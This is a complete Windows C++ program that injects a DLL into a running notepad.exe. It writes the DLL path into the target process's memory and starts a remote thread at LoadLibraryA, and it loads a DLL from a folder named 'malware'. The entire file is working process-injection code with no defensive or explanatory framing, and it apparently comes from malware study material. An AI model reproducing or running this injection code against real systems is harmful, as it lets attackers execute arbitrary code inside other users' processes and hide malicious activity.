// cl /EHsc .\basic.cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetProcessID(const wchar_t* processName)
{
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe))
        {
            do
            {
                if (_wcsicmp(pe.szExeFile, processName) == 0)
                {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool InjectDLL(DWORD processID, const char* dllPath)
{
    std::cout << "Trying to open process with ID \t\t" << processID;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess)
    {
        std::cerr << "[-] Failed to open target process.\n";
        return false;
    } std::cout << " [done]" << std::endl;

    
    std::cout << "Trying to allocate memory into process with ID " << processID << "\t\t";
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory)
    {
        std::cerr << "[-] Failed to allocate memory in target process.\n";
        CloseHandle(hProcess);
        return false;
    } std::cout << " [done]" << std::endl;


    std::cout << "Trying to write memory into process with ID " << processID << "\t\t";
    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, strlen(dllPath) + 1, NULL))
    {
        std::cerr << "[-] Failed to write DLL path to target process.\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    } std::cout << " [done]" << std::endl;


    std::cout << "Trying to find LoadLibraryA function in process with ID " << processID << "\t\t";
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr)
    {
        std::cerr << "[-] Failed to get address of LoadLibraryA.\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    } 
    std::cout << " [done] LoadLibraryA address: " << loadLibraryAddr << std::endl;
    

    std::cout << "Trying to create remote thread ";
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMemory, 0, NULL);
    if (!hThread)
    {
        std::cerr << "[-] Failed to create remote thread.\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    } std::cout << " [done]" << std::endl;

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

int main()
{
    const char* dllPath = "C:\\malware\\dll_injection\\basic_dll\\cute_lib.dll";
    
    std::cout << "Trying to get a handle to the process...\n"; 
    DWORD processID = GetProcessID(L"notepad.exe");
    if (processID == 0)
    {
        std::cerr << "[-] Target process not found.\n";
        return 1;
    } std::cout << "Process ID: " << processID << "\n";

    try
    {
        if (InjectDLL(processID, dllPath)) std::cout << "[+] DLL successfully injected!\n";
        else std::cerr << "[-] DLL injection failed.\n";
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }
    
    return 0;
}
